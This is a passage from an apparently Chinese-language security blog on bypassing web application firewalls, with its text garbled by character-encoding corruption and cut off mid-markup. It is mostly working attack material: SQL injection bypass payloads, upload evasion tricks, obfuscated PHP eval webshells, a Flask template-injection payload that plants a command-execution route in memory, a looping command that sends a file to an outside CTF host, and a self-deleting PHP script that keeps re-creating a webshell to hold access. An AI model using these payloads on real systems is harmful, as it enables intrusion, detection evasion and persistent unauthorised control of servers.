æ­¤ç»™<code>GET</code>è¯·æ±‚å˜æˆ<code>POST</code>è¯·æ±‚æœ‰å¯èƒ½ç»•è¿‡æ‹¦æˆªã€‚</li><li>ä¸€äº› WAF æ£€æµ‹åˆ°<code>POST</code>è¯·æ±‚åï¼Œå°±ä¸ä¼šå¯¹<code>GET</code>æºå¸¦çš„å‚æ•°è¿›è¡Œè¿‡æ»¤æ£€æµ‹ï¼Œå› æ­¤å¯¼è‡´è¢«ç»•è¿‡ã€‚</li></ol><h5 id="FUZZ"><a href="#FUZZ" class="headerlink" title="FUZZ"></a>FUZZ</h5><blockquote><p>fuzzå¤§æ³•ï¼Œä½¿ç”¨è„šæœ¬å»æ¢æµ‹WAFè®¾å¤‡å¯¹äºå­—ç¬¦å¤„ç†æ˜¯å¦æœ‰å¼‚å¸¸ï¼Œä¸€äº›WAFå¯èƒ½ç”±äºè‡ªèº«çš„è§£æé—®é¢˜ï¼Œå¯¹äºæŸäº›å­—ç¬¦è§£æå‡ºé”™ï¼Œé€ æˆå…¨å±€çš„bypass</p></blockquote><p>æµ‹è¯•ç‚¹</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">1ï¼‰ï¼šgetè¯·æ±‚å¤„ </span><br><span class="line">2ï¼‰ï¼šheaderè¯·æ±‚å¤„ </span><br><span class="line">3ï¼‰ï¼špost urlencodeå†…å®¹å¤„ </span><br><span class="line">4ï¼‰ï¼špost form-dataå†…å®¹å¤„</span><br></pre></td></tr></table></figure><p>åŸºç¡€å†…å®¹</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">1ï¼‰ç¼–ç è¿‡çš„0-255å­—ç¬¦ </span><br><span class="line">2ï¼‰è¿›è¡Œç¼–ç çš„0-255å­—ç¬¦ </span><br><span class="line">3ï¼‰utf gbkå­—ç¬¦</span><br></pre></td></tr></table></figure><h3 id="æ­£é¢ç¡¬åˆš"><a href="#æ­£é¢ç¡¬åˆš" class="headerlink" title="æ­£é¢ç¡¬åˆš"></a>æ­£é¢ç¡¬åˆš</h3><blockquote><p>å¢å¢æ”¹æ”¹æ··æ·†è§†å¬ï¼Œä½¿wafçš„è§„åˆ™å’Œç­–ç•¥å¤±æ•ˆ</p><p><strong>åŸºæœ¬æ–¹é’ˆ</strong>ï¼š</p><ol><li>å¢åˆ æµ‹è¯•wafå®¹å¿åº¦ï¼Œç¡®è®¤å…³é”®ç‚¹</li><li>æœ¬åœ°FUZZ PAYLOAD,å…ˆä¿è¯å¯ä»¥ç»•è¿‡æ£€æµ‹</li><li>å†æ¬¡è¿›è¡Œæ„é€ ä½¿å¾—åç«¯èƒ½å¤Ÿè¿›è¡Œè§£æ</li></ol></blockquote><h4 id="sqlæ³¨å…¥"><a href="#sqlæ³¨å…¥" class="headerlink" title="sqlæ³¨å…¥"></a>sqlæ³¨å…¥</h4><p>ç®€å•fuzz</p><p><img src="/../images/image-20230517001306283.png" alt="image-20230517001306283"></p><p>å¯ä»¥å‘ç°ä¸ä¼šå¯¹å•ä¸€çš„å…³é”®å­—è¿›è¡Œè¿‡æ»¤ï¼Œä¼šå¯¹ä¸€äº›ç»„åˆè¿›è¡Œè¿‡æ»¤</p><h5 id="union-selectç»•è¿‡"><a href="#union-selectç»•è¿‡" class="headerlink" title="union selectç»•è¿‡"></a><code>union select</code>ç»•è¿‡</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union (select)</span><br><span class="line">UNiOn/*/1/*/select</span><br><span class="line">UNiOn--+%02%0d%0aselect    #æ³¨é‡Šæ¢è¡Œ</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">UNiOn</span><span class="comment">/**/</span><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>#</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230516154023102.png" alt="image-20230516154023102"></p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">UNiOn</span><span class="comment">/*/1/*/</span><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>#</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230516154137250.png" alt="image-20230516154137250"></p><p>åœ¨<code>/**/</code>ä¸­æ’å…¥<code>/x/</code>å³å¯ï¼Œxè‡³å°‘ä¸ºä¸€ä¸ªå­—ç¬¦</p><h5 id="å‡½æ•°ç»•è¿‡"><a href="#å‡½æ•°ç»•è¿‡" class="headerlink" title="å‡½æ•°ç»•è¿‡"></a>å‡½æ•°ç»•è¿‡</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span><span class="comment">/*/1/*/</span><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,database()<span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230516221518813.png" alt="image-20230516221518813"></p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span><span class="comment">/*/1/*/</span><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,database<span class="comment">/**/</span>()<span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230516221551123.png" alt="image-20230516221551123"></p><p>FUZZç»“æœ</p><p><img src="/../images/image-20230517000942363.png" alt="image-20230517000942363"></p><p><img src="/../images/image-20230517000931846.png" alt="image-20230517000931846"></p><h5 id="select-from"><a href="#select-from" class="headerlink" title="select from"></a><code>select from</code></h5><p>ç¡¬åˆšG</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">åˆ†å—ä¼ è¾“ï¼Œè„æ•°æ®ç­‰æˆåŠŸ</span><br></pre></td></tr></table></figure><h4 id="æ–‡ä»¶ä¸Šä¼ "><a href="#æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="æ–‡ä»¶ä¸Šä¼ "></a>æ–‡ä»¶ä¸Šä¼ </h4><h5 id="wafæ£€æµ‹å†…å®¹"><a href="#wafæ£€æµ‹å†…å®¹" class="headerlink" title="wafæ£€æµ‹å†…å®¹"></a>wafæ£€æµ‹å†…å®¹</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">è¯·æ±‚çš„url</span><br><span class="line">Boundaryè¾¹ç•Œ</span><br><span class="line">MIMEç±»å‹</span><br><span class="line">æ–‡ä»¶åç¼€å</span><br><span class="line">æ–‡ä»¶å¤´</span><br><span class="line">æ–‡ä»¶å†…å®¹</span><br><span class="line">è®¿é—®æµé‡</span><br></pre></td></tr></table></figure><h5 id="æ–‡ä»¶ä¸Šä¼ æ•°æ®åŒ…"><a href="#æ–‡ä»¶ä¸Šä¼ æ•°æ®åŒ…" class="headerlink" title="æ–‡ä»¶ä¸Šä¼ æ•°æ®åŒ…"></a>æ–‡ä»¶ä¸Šä¼ æ•°æ®åŒ…</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">    </span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9zWBDx6vAJHGTpAl</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary9zWBDx6vAJHGTpAl</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;shell.php&quot;</span></span><br><span class="line">Content-Type: image/png</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary9zWBDx6vAJHGTpAl</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span><br><span class="line"></span><br><span class="line">submit</span><br><span class="line">------WebKitFormBoundary9zWBDx6vAJHGTpAl--</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">boundary=----WebKitFormBoundary9zWBDx6vAJHGTpAl å®šä¹‰äº†BODYä¸­çš„åˆ†ç•Œçº¿(å› ä¸ºæ˜¯è°·æ­Œæµè§ˆå™¨ï¼Œæ‰€ä»¥åˆ†ç•Œçº¿ä¸º----WebKitFormBoundaryåŠ ä¸Šéšæœºå­—ç¬¦ä¸²)</span><br><span class="line"></span><br><span class="line">--boundary</span><br><span class="line"></span><br><span class="line">--boundary   <span class="comment"># æ¯ä¸¤ä¸ªåˆ†ç•Œçº¿ä¹‹é—´æ˜¯å…·ä½“çš„å†…å®¹ï¼šæ–‡ä»¶ä¸Šä¼ ï¼Œpostå‚æ•°</span></span><br><span class="line"></span><br><span class="line">--boundary--  <span class="comment"># ç»“æŸæ ‡å¿—</span></span><br></pre></td></tr></table></figure><h5 id="å®‰å…¨ğŸ•æµ‹è¯•"><a href="#å®‰å…¨ğŸ•æµ‹è¯•" class="headerlink" title="å®‰å…¨ğŸ•æµ‹è¯•"></a>å®‰å…¨ğŸ•æµ‹è¯•</h5><ul><li><p>ä¸å…è®¸phpåç¼€ä¸Šä¼ </p></li><li><p>ä¸Šä¼ æ—¶ï¼Œä¸æ£€æŸ¥æ–‡ä»¶å†…å®¹</p></li><li><p>è®¿é—®æ—¶ï¼Œä¸å…è®¸è®¿é—®å«æœ‰æ¶æ„å†…å®¹çš„phpæ–‡ä»¶</p></li></ul><h6 id="ç»•è¿‡åç¼€"><a href="#ç»•è¿‡åç¼€" class="headerlink" title="ç»•è¿‡åç¼€"></a>ç»•è¿‡åç¼€</h6><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Content-Type: multipart/form-data; boundary=a</span><br><span class="line"></span><br><span class="line">å¢åŠ å¤šä¸ªboundary</span><br><span class="line">phpï¼šå¯ä»¥åœ¨boundaryå‰åæ·»åŠ ä»»æ„å­—ç¬¦</span><br><span class="line">å¤§å°å†™</span><br><span class="line">boundary=boundary=a</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;shell.php&quot;</span></span><br><span class="line"></span><br><span class="line">æ“ä½œï¼š</span><br><span class="line">å¤§å°å†™</span><br><span class="line">Content-Disposition ä»»æ„ä½ç½®æ¢è¡Œ,ç©ºæ ¼ï¼Œè„æ•°æ®æº¢å‡ºï¼Œå¤šä¸ªContent-Dispositionï¼Œform-dataï¼ˆåˆ é™¤ï¼Œæ”¹ä¸º*ï¼‰</span><br><span class="line">å¤šä¸ªfilenameï¼Œå¤šä¸ª;</span><br><span class="line">æ–‡ä»¶åå•åŒå¼•å·æ•°é‡</span><br><span class="line">content-typeï¼ˆå¢åˆ ï¼Œè®¾ç½®charsetï¼‰</span><br><span class="line">å¤šä¸ªBODY</span><br><span class="line">å¤šä¸ªboundary</span><br><span class="line">äº¤æ¢nameå’Œfilenameçš„é¡ºåº</span><br><span class="line">æ’åˆ—ç»„åˆ</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Accept-Encoding: </span><br><span class="line">Accept-Encoding: gzip</span><br><span class="line">Accept-Encoding: compress</span><br><span class="line">Accept-Encoding: deflate</span><br><span class="line">Accept-Encoding: br</span><br><span class="line">Accept-Encoding: identity</span><br><span class="line">Accept-Encoding: *</span><br></pre></td></tr></table></figure><p>Windows</p><ul><li>NTFS æµ</li></ul><p>  <a href="https://learn.microsoft.com/zh-cn/windows/win32/fileio/file-streams">æ–‡ä»¶æµ (æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿ) - Win32 apps | Microsoft Learn</a></p><p>  fuzzå¯ä»¥çš„</p>  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">::$DATA</span><br><span class="line">::$INDEX_ALLOCATION</span><br></pre></td></tr></table></figure><p>  <img src="/../images/20171227163716-2507a226-eae1-1.png" alt="20171227163716-2507a226-eae1-1"></p><p>  <img src="/../images/image-20230517195752567.png" alt="image-20230517195752567"></p><ul><li><p>æ–‡ä»¶å</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">æ–‡ä»¶åå°¾åŠ ä»»æ„ä¸ª. æˆ–è€…ä»»æ„ä¸ªç©ºæ ¼ï¼ˆå¯¹æ–‡ä»¶åæ— å½±å“ï¼‰</span><br><span class="line"></span><br><span class="line">windowsæ–‡ä»¶åçš„ä¿ç•™å­—ç¬¦ï¼ˆä¸å…è®¸å‡ºç°ï¼‰</span><br><span class="line">\/:*?<span class="string">&quot; &lt;&gt;|</span></span><br><span class="line"><span class="string">å¯ä»¥å°è¯•åœ¨æ–‡ä»¶åååŠ ä¸Šè¿™äº›å­—ç¬¦</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å½“filename=shell.php:.jpg</span><br><span class="line">ç»“æœï¼š</span><br><span class="line">å¯ä»¥ä¸Šä¼ shell.phpï¼Œä½†æ˜¯ä¼šåƒæ‰æ–‡ä»¶å†…å®¹ã€‚ã€‚ã€‚</span><br><span class="line">å…¶ä»–çš„è¦ä¸ä¸å¯ä»¥ï¼Œå¯ä»¥çš„è¯ï¼Œä¸Šä¼ çš„æ–‡ä»¶åä¸º.jpg</span><br></pre></td></tr></table></figure></li></ul><p><img src="/../images/image-20230517155239619.png" alt="image-20230517155239619"></p><ul><li><p>æ–‡ä»¶åé•¿åº¦</p><p>æˆªæ–­è¶…é•¿æ–‡ä»¶å</p><p>windowsæ–‡ä»¶åï¼šé•¿åº¦é™åˆ¶å®Œå…¨é™å®šæ–‡ä»¶åå¿…é¡»å°‘äº260ä¸ªå­—ç¬¦ï¼Œç›®å½•åå¿…é¡»å°äº248ä¸ªå­—ç¬¦</p><p>linuxæ–‡ä»¶åï¼šlinuxä¸­æ–‡ä»¶åæœ€é•¿ä¸º255å­—ç¬¦ï¼Œæ–‡ä»¶è·¯å¾„æœ€å¤§é•¿åº¦ä¸º4096å­—ç¬¦</p><p>å¦‚æœåç«¯è„šæœ¬æ²¡æœ‰é™åˆ¶ä¸Šä¼ æ–‡ä»¶åé•¿åº¦ï¼Œå¯ä»¥é€šè¿‡å¤šæ¬¡æµ‹è¯•ï¼Œä¸Šä¼ åä¸ºaaaaaâ€¦(200+).php.jpgï¼ŒæŠŠæœ€åçš„.jpgæŒ¤å‡ºå»ã€‚</p></li></ul><p><strong>éƒ¨åˆ†æˆåŠŸçš„ï¼Œå¥½ç»•</strong></p><p>wafæ˜¯è§£ææœ€åä¸€ä¸ªå‚æ•°ï¼Œæœ€åä¸€ä¸ª;åé¢çš„ï¼Œä½†æ˜¯å¦‚æœæœ€åä¸€ä¸ªï¼›åé¢æ²¡æœ‰å‚æ•°ï¼Œ</p><p>åç«¯å°±å–å‰ä¸€ä¸ª,wafè¯†åˆ«åˆ°ç©º</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">filename=shell.php;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230517144614924.png" alt="image-20230517144614924"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">filename=<span class="string">&#x27;shell.php&#x27;</span>; <span class="comment"># åŒå¼•å·ä¸è¡Œ</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230517144541805.png" alt="image-20230517144541805"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>;filename=shell.php</span><br><span class="line"></span><br><span class="line">é™¤äº†shell.phpå¤„ï¼Œå…¶ä»–åœ°æ–¹åŠ æ¢è¡Œï¼Œæˆ–è„æ•°æ®éƒ½å¯</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230517145839048.png" alt="image-20230517145839048"></p><p>åˆ é™¤<code>content-type</code></p><p><img src="/../images/image-20230517153416749.png" alt="image-20230517153416749"></p><p>å¢åŠ <code>boundary</code></p><p><img src="/../images/image-20230517175433650.png" alt="image-20230517175433650"></p><p>å®‰å…¨ğŸ•+ä»£ç ç™½åå•ï¼ˆåç¼€åªå…è®¸å›¾ç‰‡ï¼‰</p><p>ä¸Šé¢ä»»æ„ä¸€ä¸ªç»•è¿‡ï¼ˆé™¤äº†ï¼›ç»•è¿‡ï¼‰+</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">filename=shell.php::$DATA.jpg</span><br></pre></td></tr></table></figure><h6 id="ç»•è¿‡æ–‡ä»¶å†…å®¹æ£€æµ‹â€“å…æ€"><a href="#ç»•è¿‡æ–‡ä»¶å†…å®¹æ£€æµ‹â€“å…æ€" class="headerlink" title="ç»•è¿‡æ–‡ä»¶å†…å®¹æ£€æµ‹â€“å…æ€"></a>ç»•è¿‡æ–‡ä»¶å†…å®¹æ£€æµ‹â€“å…æ€</h6><p>å®‰å…¨ğŸ•çš„å†…å®¹æ£€æµ‹éšä¾¿æ”¹ä¸€ä¸‹å°±è¿‡äº†ã€‚</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="comment">// $cmd = base64_decode($_POST[1]);</span></span><br><span class="line"><span class="variable">$foo</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h6 id="ç»•è¿‡æµé‡"><a href="#ç»•è¿‡æµé‡" class="headerlink" title="ç»•è¿‡æµé‡"></a>ç»•è¿‡æµé‡</h6><p>æµ‹è¯•æ—¶</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;xxx&quot;</span>) <span class="comment">#å‘½ä»¤æ‰§è¡Œé™åˆ¶</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230517211700124.png" alt="image-20230517211700124"></p><p>å¯¹æµé‡è¿›è¡Œä¸€ä¸ª<code>base64</code>åŠ å¯†å³å¯</p><p><code>webshell</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$cmd</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="variable">$foo</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>èšå‰‘</p><p>ç¼–ç å™¨</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">data[pwd] = Buffer.<span class="keyword">from</span>(data[<span class="string">&#x27;_&#x27;</span>]).<span class="title function_ invoke__">toString</span>(<span class="string">&#x27;base64&#x27;</span>);</span><br></pre></td></tr></table></figure><p>é€‰æ‹©ç¼–ç å™¨</p><p><img src="/../images/image-20230517211627163.png" alt="image-20230517211627163"></p><h5 id="webshellå…æ€"><a href="#webshellå…æ€" class="headerlink" title="webshellå…æ€"></a>webshellå…æ€</h5><ul><li>wafæ£€æµ‹</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å†…å®¹ã€åˆ›å»ºæ—¥æœŸã€æ–‡ä»¶å¤§å°ã€é€šä¿¡æµé‡ç‰¹å¾</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å¯¹äºé™æ€å¼•æ“çš„ç»•è¿‡ï¼Œå¯ä»¥é€šè¿‡æ‹†åˆ†å…³é”®è¯ã€</span><br><span class="line">åŠ å…¥èƒ½å¤Ÿå¼•å‘è§£æå¹²æ‰°çš„ç•¸å½¢å­—ç¬¦ç­‰;</span><br><span class="line"></span><br><span class="line">è€Œå¯¹äºåŠ¨æ€å¼•æ“ï¼Œéœ€è¦åˆ†æå®ƒè·Ÿè¸ªäº†å“ªäº›è¾“å…¥</span><br><span class="line">ç‚¹ï¼Œåˆæ˜¯å¦‚ä½•è·Ÿè¸ªå˜é‡çš„ï¼Œæœ€ç»ˆæ˜¯åœ¨å“ªäº›å‡½æ•°çš„å“ªäº›å‚æ•°å‘½ä¸­äº†æ¶æ„æ ·æœ¬è§„åˆ™</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å¦ç±»çš„å…¥å£</span><br><span class="line">å„ç§æ··æ·†ï¼ˆç¼–ç åŠ å¯†ï¼Œè¿›åˆ¶è½¬æ¢ï¼Œååºåˆ—åŒ–...ï¼‰</span><br><span class="line">ç¬¦å·å¹²æ‰°ï¼Œç»•è¿‡æ­£åˆ™ï¼Œæ‹¼æ¥null,\n,\r,\tç­‰</span><br><span class="line">ä¿¡æ¯å·®ç»•è¿‡ï¼ˆåŠ å…¥å¤–éƒ¨å› ç´ åæ‰æ˜¯webshelï¼Œé‡å­WEBshellğŸ˜‹ï¼‰æ¯”å¦‚æˆªå–æ–‡ä»¶åï¼Œç›®å½•åï¼Œä¼ å…¥éšæœºæ•°ç§å­ç­‰</span><br></pre></td></tr></table></figure><ul><li>ä¼ ç»Ÿwebshell</li></ul><p>å­¦ä¹ ï¼š</p><p><a href="https://cloud.tencent.com/developer/article/1625439">WebShellé€šç”¨å…æ€çš„æ€è€ƒ - è…¾è®¯äº‘å¼€å‘è€…ç¤¾åŒº-è…¾è®¯äº‘</a></p><p><a href="https://github.com/LandGrey/webshell-detect-bypass/blob/master/docs/php-webshell-detect-bypass/php-webshell-detect-bypass.md">https://github.com/LandGrey/webshell-detect-bypass/blob/master/docs/php-webshell-detect-bypass/php-webshell-detect-bypass.md</a></p><p><a href="https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/webshell%E5%85%8D%E6%9D%80%E6%80%BB%E7%BB%93/">https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/webshell%E5%85%8D%E6%9D%80%E6%80%BB%E7%BB%93/</a></p><p>ä»£ç å®¡è®¡çŸ¥è¯†æ˜Ÿçƒ</p><p>æ”¶é›†ï¼š</p><p><a href="https://github.com/tennc/webshell">https://github.com/tennc/webshell</a></p><ul><li>æ— æ–‡ä»¶è½åœ°â€“å†…å­˜é©¬</li></ul><p>python</p><p><a href="https://xz.aliyun.com/t/10933#toc-4">https://xz.aliyun.com/t/10933#toc-4</a></p><p>é€šè¿‡æ³¨å†Œè·¯ç”±å¤„ç†æ¥å®ç°æ³¨å…¥</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># flask 1.x æ˜¯å¯ä»¥çš„</span></span><br><span class="line">?name=&#123;&#123;get_flashed_messages|attr(<span class="string">&quot;\x5f\x5fgetattribute\x5f\x5f&quot;</span>)(<span class="string">&quot;\x5f\x5fglobals\x5f\x5f&quot;</span>)|attr(<span class="string">&quot;\x5f\x5fgetattribute\x5f\x5f&quot;</span>)(<span class="string">&quot;\x5f\x5fgetitem\x5f\x5f&quot;</span>)(<span class="string">&quot;__builtins__&quot;</span>)|attr(<span class="string">&quot;\x5f\x5fgetattribute\x5f\x5f&quot;</span>)(<span class="string">&quot;\x5f\x5fgetitem\x5f\x5f&quot;</span>)(<span class="string">&quot;\u0065\u0076\u0061\u006c&quot;</span>)(<span class="string">&quot;app.add_ur&quot;</span>+<span class="string">&quot;l_rule(&#x27;/khaz&#x27;, &#x27;khaz&#x27;, la&quot;</span>+<span class="string">&quot;mbda :__imp&quot;</span>+<span class="string">&quot;ort__(&#x27;o&quot;</span>+<span class="string">&quot;s&#x27;).po&quot;</span>+<span class="string">&quot;pen(_request_c&quot;</span>+<span class="string">&quot;tx_stack.to&quot;</span>+<span class="string">&quot;p.re&quot;</span>+<span class="string">&quot;quest.args.get(&#x27;cmd&#x27;)).re&quot;</span>+<span class="string">&quot;ad())&quot;</span>,&#123;<span class="string">&#x27;\u005f\u0072\u0065\u0071\u0075\u0065\u0073\u0074\u005f\u0063\u0074\u0078\u005f\u0073\u0074\u0061\u0063\u006b&#x27;</span>:get_flashed_messages|attr(<span class="string">&quot;\x5f\x5fgetattribute\x5f\x5f&quot;</span>)(<span class="string">&quot;\x5f\x5fglobals\x5f\x5f&quot;</span>)|attr(<span class="string">&quot;\x5f\x5fgetattribute\x5f\x5f&quot;</span>)(<span class="string">&quot;\x5f\x5fgetitem\x5f\x5f&quot;</span>)(<span class="string">&quot;\u005f\u0072\u0065\u0071\u0075\u0065\u0073\u0074\u005f\u0063\u0074\u0078\u005f\u0073\u0074\u0061\u0063\u006b&quot;</span>),<span class="string">&#x27;app&#x27;</span>:get_flashed_messages|attr(<span class="string">&quot;\x5f\x5fgetattribute\x5f\x5f&quot;</span>)(<span class="string">&quot;\x5f\x5fglobals\x5f\x5f&quot;</span>)|attr(<span class="string">&quot;\x5f\x5fgetattribute\x5f\x5f&quot;</span>)(<span class="string">&quot;\x5f\x5fgetitem\x5f\x5f&quot;</span>)(<span class="string">&quot;\u0063\u0075\u0072\u0072\u0065\u006e\u0074\u005f\u0061\u0070\u0070&quot;</span>)&#125;)&#125;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">/khaz?cmd=whoami</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230531192216503.png" alt="image-20230531192216503"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># åƒµå°¸è¿›ç¨‹ è®°å¾—ç¼–ç </span></span><br><span class="line">system(<span class="string">&quot;python3 -c \&quot;while 1:exec(\\\&quot;flag=__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()[:-1];print(flag);io=__import__(&#x27;requests&#x27;).get(&#x27;https://ctf.bugku.com/pvp/submit.html?token=67c0d48c49a89cc434b2f95da944e759&amp;flag=&#x27;+flag);print(io.content);__import__(&#x27;time&#x27;).sleep(600);\\\&quot;);\&quot; &amp; &quot;</span>);</span><br></pre></td></tr></table></figure><p>åƒµå°¸è¿›ç¨‹ ï¼š å­è¿›ç¨‹å…ˆäºçˆ¶è¿›ç¨‹é€€å‡ºï¼Œçˆ¶è¿›ç¨‹åˆæ²¡æœ‰å¤„ç†å­è¿›ç¨‹çš„é€€å‡ºçŠ¶æ€ï¼Œæ­¤æ—¶å­è¿›ç¨‹å°±ä¼šç§°ä¸ºåƒµå°¸è¿›ç¨‹ã€‚</p><p>çˆ¶è¿›ç¨‹é€šè¿‡<code>sleep(600)</code>ä¿è¯å­è¿›ç¨‹ä¼˜å…ˆäºçˆ¶è¿›ç¨‹é€€å‡º</p><p><a href="https://blog.csdn.net/Freshduke/article/details/111544319">(77æ¡æ¶ˆæ¯) pythonåƒµå°¸è¿›ç¨‹çš„äº§ç”Ÿå’Œåƒµå°¸è¿›ç¨‹è‡ªåŠ¨å¤„ç†_pipeå¯¼è‡´åƒµå°¸è¿›ç¨‹_Jimmy-TONGçš„åšå®¢-CSDNåšå®¢</a></p><p>php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="title function_ invoke__">ignore_user_abort</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="title function_ invoke__">unlink</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="variable">$content</span> = <span class="string">&#x27;&lt;?php @eval($_POST[&quot;123&quot;]) ?&gt;&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;snert.php&quot;</span>, <span class="variable">$content</span>);</span><br><span class="line">    <span class="title function_ invoke__">usleep</span>(<span class="number">10000</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>é€šè¿‡å†…å­˜é©¬å¯åŠ¨ååˆ é™¤æ–‡ä»¶æœ¬èº«ä¹‹å‰ï¼Œä½¿ä»£ç åœ¨å†…å­˜ä¸­æ‰§è¡Œæ­»å¾ªç¯ï¼Œä½¿ç®¡ç†å‘˜æ— æ³•åˆ é™¤å†…å­˜é©¬ï¼Œè¾¾åˆ°æƒé™ç»´æŒçš„ç›®çš„ã€‚</p><p>JAVA</p><p>æ”¾åœ¨javaå®‰å…¨é‡Œå§</p><h5 id="æµé‡ç»•è¿‡"><a href="#æµé‡ç»•è¿‡" class="headerlink" title="æµé‡ç»•è¿‡"></a>æµé‡ç»•è¿‡</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span 